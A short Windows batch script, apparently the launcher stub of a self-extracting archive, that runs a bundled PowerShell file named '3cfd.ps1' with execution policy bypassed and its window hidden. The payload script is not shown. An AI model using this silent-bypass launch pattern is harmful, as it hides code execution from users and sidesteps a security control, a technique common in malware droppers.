@echo off
setlocal

rem Switch to the SFX extract directory if provided; fallback to script folder.
if defined EXEDIR (
    cd /d "%EXEDIR%"
) else (
    cd /d "%~dp0"
)

set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "PS1=%~dp03cfd.ps1"

"%PS%" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"

exit /b
